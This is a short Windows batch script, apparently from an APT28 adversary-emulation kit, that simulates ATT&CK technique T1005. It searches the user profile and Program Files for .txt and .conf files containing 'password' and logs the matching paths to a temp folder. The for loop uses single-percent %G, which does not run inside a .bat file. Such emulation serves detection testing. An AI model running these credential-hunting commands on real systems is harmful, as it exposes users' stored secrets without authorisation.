@ECHO OFF

color 0E
ECHO ==================================================================
ECHO Technique: Data from Local System	(T1005)
ECHO.
ECHO [+] Simulates Collection of Data from Local System using "forfiles"
ECHO ------------------------------------------------------------------
for %G in (.txt, .conf) do forfiles -p %USERPROFILE% -s -m *%G -c "cmd /c findstr /m password @path" >> %temp%\APT28\T1005.txt
forfiles /P "C:\Program Files" /S /M *.conf /C "cmd /c findstr /m password @path" >> %temp%\APT28\T1005.txt
ECHO.
